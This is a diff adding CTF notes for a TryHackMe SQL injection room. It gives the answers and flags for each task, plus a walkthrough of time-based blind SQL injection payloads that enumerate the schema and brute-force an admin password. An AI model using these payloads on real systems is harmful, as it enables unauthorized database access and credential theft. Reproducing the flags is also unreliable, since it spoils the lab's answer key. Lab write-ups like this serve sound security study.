@@ -168,3 +168,48 @@ https://tryhackme.com/room/basicpentestingjt
 https://tryhackme.com/room/ignite
 https://tryhackme.com/room/picklerick
 https://tryhackme.com/room/ctf
+
+# sqlinjectionlm
+Task 1: Structured Query Language
+Task 2:
+- DBMS
+- table
+Task 3:
+- SELECT
+- UNION
+- INSERT
+Task 4: ";'
+Task 5: THM{SQL_INJECTION_3840}
+- For this you have to use database() to get the name of the database
+- Then using group_concat and pulling from information_schema.tables to get infromation on the structe of the database
+- Then you make a request to the staff_users to get all the information from there
+Task 6: THM{SQL_INJECTION_9581}
+Task 7: THM{SQL_INJECTION_1093}
+- This is a very brute forcy requestion. You are given an restricted API that return True/False 
+- Its your job to pbrute force the names of the tables and columns then brute force the name of a user and their password.
+Task 8: THM{SQL_INJECTION_MASTER}
+- The hint is misleading.
+- If the delay is too small then your sleep command never ran so that means your search was false (becuase look-up is in the miliseconds).
+- First query should be 
+admin123' UNION SELECT SLEEP(1), 2 where database() like 's%';--
+- For you to then relise that the database is called "sqli_four"
+- Then you need to find the users table (with the login infomration) so you guess that the table is called 'users'
+admin123' UNION SELECT SLEEP(1), 2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name='users';--
+- This confirms that the table is called users
+admin123' UNION SELECT SLEEP(1), 2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password';--
+admin123' UNION SELECT SLEEP(1), 2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'username';--
+- This confirms that the table is called users and there is a password and username columns
+admin123' UNION SELECT SLEEP(1), 2 from users where username like 'admin';--
+- This confnrms that the admin uses the username of 'admin'
+admin123' UNION SELECT SLEEP(1),3 from users where username='admin' and password like '%';--
+- Now you can start brute forcing the password
+admin123' UNION SELECT SLEEP(1),3 from users where username='admin' and password like '4%';--
+admin123' UNION SELECT SLEEP(1),3 from users where username='admin' and password like '49%';--
+admin123' UNION SELECT SLEEP(1),3 from users where username='admin' and password like '496%';--
+admin123' UNION SELECT SLEEP(1),3 from users where username='admin' and password like '4961%';--
+admin123' UNION SELECT SLEEP(1),3 from users where username='admin' and password like '4961';--
+Task 9: DNS (Domain name SYSTEM, not server)
+Task 10: Prepared Statements
+
+
+
